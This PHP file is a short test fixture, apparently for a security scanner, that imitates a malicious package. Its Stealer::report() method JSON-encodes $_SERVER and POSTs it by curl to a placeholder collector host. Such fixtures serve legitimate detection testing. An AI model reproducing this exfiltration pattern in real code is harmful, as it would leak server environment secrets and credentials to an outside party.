<?php
// TEST FIXTURE: imitates a package that exfiltrates the environment. Never executed.
namespace Evil;

final class Stealer
{
    public static function report(): void
    {
        $ch = curl_init('https://collector.example.invalid/c');
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($_SERVER));
        curl_exec($ch);
    }
}
